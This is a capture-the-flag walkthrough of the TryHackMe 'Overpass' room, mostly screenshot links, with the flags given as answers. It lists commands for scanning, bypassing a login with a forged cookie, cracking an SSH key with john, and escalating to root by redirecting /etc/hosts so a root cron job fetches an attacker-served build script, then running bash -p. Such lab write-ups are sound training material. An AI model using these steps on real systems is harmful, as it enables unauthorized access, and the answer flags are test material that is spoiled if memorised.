What happens when a group of broke Computer Science students try to make a password manager?  
Obviously a _perfect_ commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.  
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.

Answer the questions below

| Question                                      | Answer                                |
| --------------------------------------------- | ------------------------------------- |
| Hack the machine and get the flag in user.txt | thm{65c1aaf000506e56996822c6281e6bf7} |

```
export IP=10.10.0.214
```

```
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap $IP
```

![[Pasted image 20240421093536.png]]


```
gobuster dir --url http://$IP --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster
```

![[Pasted image 20240421093601.png]]

*Page source:*

![[Pasted image 20240421094227.png]]

*Check login.js:*

![[Pasted image 20240421122348.png]]


![[Pasted image 20240421122833.png]]

*Change the cookie (using curl or cookie editor and send it:*

```
curl "http://10.10.24.195/admin/" --cookie "SessionToken=anything"
```

![[Pasted image 20240421123229.png]]
![[Pasted image 20240421123252.png]]


*Add it in browser:*

![[Pasted image 20240421123814.png]]

*Run and refresh the page:*

![[Pasted image 20240421123857.png]]


*Download the SSH private key to a Id_rsa file and change its permissions::*

![[Pasted image 20240421124245.png]]

*Crack it using john:*

```
ssh2john id_rsa > rsa
```

![[Pasted image 20240421124532.png]]

```
john --wordlist=/usr/share/wordlists/rockyou.txt rsa
```

![[Pasted image 20240421124653.png]]

*Connect to SSH using the credentials:*

![[Pasted image 20240421124922.png]]


```
ssh -i id_rsa james@10.10.24.195
```

![[Pasted image 20240421125257.png]]

![[Pasted image 20240421192741.png]]


*Download the files from /downloads:*

![[Pasted image 20240421094446.png]]

*Run overpassLinux:*

![[Pasted image 20240421094905.png]]

| Question                                              | Answer                                |
| ----------------------------------------------------- | ------------------------------------- |
| Escalate your privileges and get the flag in root.txt | thm{7f336f8c359dbac18d54fdd64ea753bb} |


*Open todo.txt:*

![[Pasted image 20240421193308.png]]

*Search for a password:*

![[Pasted image 20240421193441.png]]

*And decode it:*

![[Pasted image 20240421193619.png]]


*Transfer linpeas to target machine:*

```
scp /usr/share/peass/linpeas/linpeas.sh james@10.10.55.227:/dev/shm
```

![[Pasted image 20240421200905.png]]

*And run it:*

![[Pasted image 20240421200953.png]]

![[Pasted image 20240421201122.png]]

![[Pasted image 20240421201356.png]]

*Modify /etc/hosts with my IP:*

![[Pasted image 20240421201624.png]]


![[Pasted image 20240421201826.png]]
![[Pasted image 20240421201810.png]]


![[Pasted image 20240421201650.png]]

*On host machine create www/downloads/src directory:*

![[Pasted image 20240421204012.png]]

![[Pasted image 20240421204022.png]]

*Create buildscript.sh file inside it:*

![[Pasted image 20240421204214.png]]



*Watch /bin/bash:*

```
watch ls -la /bin/bash
```

![[Pasted image 20240421203433.png]]

![[Pasted image 20240421203312.png]]


*Start local server on port 80:*

![[Pasted image 20240421203203.png]]

*And see GET request at the end of the minute:*

![[Pasted image 20240421220002.png]]


*Run /bin/bash:*

```
/bin/bash -p
```

![[Pasted image 20240421215937.png]]

![[Pasted image 20240421220140.png]]
